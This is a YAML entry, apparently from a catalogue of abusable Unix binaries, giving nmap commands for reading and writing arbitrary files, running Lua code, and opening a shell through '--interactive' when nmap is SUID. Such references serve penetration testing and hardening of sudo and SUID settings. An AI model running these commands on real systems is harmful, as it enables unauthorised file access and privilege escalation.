        nmap:
          functions:
            file-read:
            - binary: false
              code: nmap -iL /path/to/input-file
              comment: The file is actually parsed as a list of hosts/networks, lines are leaked through
                error messages.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            file-write:
            - code: nmap -oG=/path/to/output-file DATA
              comment: The payload appears inside the regular nmap output.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            inherit:
            - code: 'echo ''...'' >/path/to/temp-file

                nmap --script=/path/to/temp-file'
              comment: This allows to run Lua code (`...`).
              contexts:
                sudo: null
                suid: null
                unprivileged: null
              from: lua
            shell:
            - code: 'nmap --interactive

                !/bin/sh'
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
              version: 2.02 to 5.21
